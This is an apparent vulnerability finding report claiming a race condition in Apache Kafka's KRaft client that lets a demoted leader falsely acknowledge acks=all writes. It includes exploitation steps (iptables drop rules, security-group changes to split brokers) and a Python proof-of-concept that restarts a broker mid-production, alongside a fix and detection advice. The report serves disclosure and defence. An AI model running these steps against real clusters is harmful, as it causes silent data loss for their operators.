# FINDING-002: KRaft High Watermark TOCTOU — False Durability Guarantee

## Metadata

| Field | Value |
|-------|-------|
| Finding ID | FINDING-002 |
| Target | `apache/kafka` |
| Component | `KafkaRaftClient` |
| Source File | `raft/src/main/java/org/apache/kafka/raft/KafkaRaftClient.java` |
| Approximate Lines | ~1900–1955 (`onUpdateLeaderHighWatermark`), ~3580–3615 (`appendAsLeader`) |
| Category | Data Integrity — False Durability / TOCTOU |
| CVSS v3.1 Estimate | **8.1 HIGH** — `CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:H/A:H` |
| CWE | CWE-367: Time-of-check Time-of-use (TOCTOU) Race Condition |
| Requires Auth | PARTIAL — requires ability to trigger leadership churn (network access or crafted messages) |
| MSK Affected | YES — MSK Standard clusters using KRaft (Kafka 3.3+) |

## Summary

In `KafkaRaftClient.onUpdateLeaderHighWatermark()`, append futures (pending `acks=all` produce requests) are completed — ACKing producers — **before** any re-validation that the node still holds quorum leadership. A demoted leader that has not yet processed its own demotion will confirm writes that exist only on its local log. When the new leader takes over, those records are truncated, causing silent data loss with valid producer acknowledgments.

## Vulnerable Code (verbatim)

```java
// KafkaRaftClient.java — onUpdateLeaderHighWatermark (lines ~1900-1950)
private void onUpdateLeaderHighWatermark(
    LeaderState<T> state,
    long currentTimeMs
) {
    state.highWatermark().ifPresent(highWatermark -> {
        logger.debug("Leader high watermark updated to {}", highWatermark);
        log.updateHighWatermark(highWatermark);

        addVoterHandler.highWatermarkUpdated(state);
        removeVoterHandler.highWatermarkUpdated(state);

        // TOCTOU WINDOW: completions happen HERE, before leadership re-check
        appendPurgatory.maybeComplete(highWatermark.offset(), currentTimeMs);
        fetchPurgatory.completeAll(currentTimeMs);
        // If this node was demoted between the last quorum check and this call,
        // these futures represent unrecognized writes — the new leader has no
        // record of them. Producer received: "written and replicated."
        // Reality: records exist only on the demoted node's local log.

        updateListenersProgress(highWatermark.offset());
    });
}
```

```java
// appendAsLeader — no post-append leadership re-validation
private LogAppendInfo appendAsLeader(Records records) {
    LogAppendInfo info = log.appendAsLeader(records, quorum.epoch());
    // TOCTOU: no re-check that quorum.isLeader() == true after log write
    return info;
}
```

## Root Cause

The Raft protocol requires that a leader only acknowledge a write as committed when a quorum of replicas has durably persisted the record. In Kafka's KRaft implementation, `onUpdateLeaderHighWatermark` advances the high watermark and immediately completes pending futures. The function does not verify that `quorum.isLeader()` is still true at the time of completion — it trusts the `LeaderState` object passed in, which may reflect a stale view of leadership if a concurrent demotion event is in flight.

## Attack Prerequisites

- Ability to trigger KRaft leader churn: network-level packet injection/delay, or by crafting Fetch responses that cause epoch bumps
- `acks=all` producers connected to the broker (standard production configuration)
- MSK cluster running Kafka 3.3+ in KRaft mode (default for new MSK clusters)

## Step-by-Step Exploitation

1. Identify the active KRaft leader for the target partition
2. Begin producing messages with `acks=all` to that partition
3. Trigger a controlled network partition between the leader and a quorum majority:
   - AWS: temporarily modify security group rules to block inter-broker traffic
   - Lab: `docker compose restart kafka-1` or `iptables -I INPUT -s kafka-2 -j DROP`
4. The demoted leader continues processing Produce requests locally (it hasn't learned of its demotion yet)
5. The leader updates its local high watermark and calls `onUpdateLeaderHighWatermark`
6. `appendPurgatory.maybeComplete()` fires — producer receives `acks=all` success
7. Network partition heals; new leader elected; demoted node truncates its log to match the new leader
8. Records confirmed to producers in step 6 no longer exist in the cluster

## Payload

```python
# Trigger leadership churn on a test cluster
# See deploy-yamls/kraft-cluster-config.yaml for lab setup
import time, threading
from kafka import KafkaProducer, KafkaConsumer

producer = KafkaProducer(
    bootstrap_servers=["localhost:19092"],
    acks="all",
    enable_idempotence=True
)

confirmed = []
def produce():
    for i in range(1000):
        future = producer.send("finding-002-test", value=f"msg-{i}".encode())
        try:
            meta = future.get(timeout=5)
            confirmed.append(i)
        except Exception as e:
            print(f"Produce failed: {e}")
        time.sleep(0.05)

t = threading.Thread(target=produce)
t.start()

# While producing: trigger leader restart to induce churn
time.sleep(2)
import subprocess
subprocess.run(["docker", "compose", "restart", "kafka-finding-1"])

t.join()
producer.flush()
producer.close()

# Compare confirmed vs actually present in cluster
consumer = KafkaConsumer(
    "finding-002-test",
    bootstrap_servers=["localhost:19092"],
    auto_offset_reset="earliest",
    consumer_timeout_ms=5000
)
received = [msg.value for msg in consumer]
consumer.close()

print(f"Producer confirmed: {len(confirmed)} messages")
print(f"Consumer received:  {len(received)} messages")
if len(confirmed) > len(received):
    print(f"[!] DATA LOSS: {len(confirmed) - len(received)} messages confirmed but missing")
```

## Expected Outcome

On a vulnerable cluster with leader churn: producer confirms delivery of N messages, consumer receives fewer than N. The gap represents records that received false `acks=all` confirmations.

## Amazon MSK Specific Impact

- **MSK Standard (KRaft clusters):** Directly affected — MSK uses KRaft as the default consensus mode for Kafka 3.3+ clusters
- **MSK Multi-AZ:** Leadership churn happens during AZ failover — this is a known operational event in MSK that can be triggered by AZ outages
- **acks=all users:** All producers using `acks=all` or `enable.idempotence=true` may receive false confirmations
- **Transactional producers:** Transactional semantics also affected — transaction completion may reference records that are subsequently lost
- **MSK Serverless:** Also uses KRaft internally — potentially affected

## Proposed Fix

Add a leadership re-check inside `onUpdateLeaderHighWatermark` before completing futures:

```java
private void onUpdateLeaderHighWatermark(LeaderState<T> state, long currentTimeMs) {
    state.highWatermark().ifPresent(highWatermark -> {
        log.updateHighWatermark(highWatermark);
        addVoterHandler.highWatermarkUpdated(state);
        removeVoterHandler.highWatermarkUpdated(state);

        // FIX: re-validate leadership before completing futures
        if (!quorum.isLeader()) {
            logger.warn("Leadership lost before completing append futures — skipping completions");
            return;
        }

        appendPurgatory.maybeComplete(highWatermark.offset(), currentTimeMs);
        fetchPurgatory.completeAll(currentTimeMs);
        updateListenersProgress(highWatermark.offset());
    });
}
```

## Detection

- **MSK Metric:** `UnderReplicatedPartitions` spike correlated with leadership election events
- **Producer metric:** Compare `record-send-total` vs broker-side `MessagesInPerSec` — a gap indicates potential false ACKs
- **Log pattern:** `LeaderEpochFileCache` truncation events on followers indicate records were discarded post-ACK
- **CloudWatch:** `OfflinePartitionsCount` > 0 during leader churn periods
